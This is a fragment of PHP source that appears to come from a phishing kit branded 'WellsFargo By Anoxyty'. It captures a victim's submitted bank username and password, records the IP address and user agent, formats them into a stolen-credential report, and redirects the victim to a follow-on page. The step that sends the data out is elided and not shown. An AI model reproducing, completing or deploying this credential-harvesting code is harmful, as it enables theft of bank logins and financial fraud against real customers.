...
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['usexxx'] ) ) {
		
		$_SESSION['usexxx'] 	  = $_POST['usexxx'];
		$_SESSION['pasxxx'] 	  = $_POST['pasxxx'];
		$code = <<<EOT
============== [ WellsFargo By Anoxyty | ]🔥 ==============
[USERNAME] 		: {$_SESSION['usexxx']}
[PASSWORD]		: {$_SESSION['pasxxx']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
...
EOT;
        ...
        header("Location: scrmderrs.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
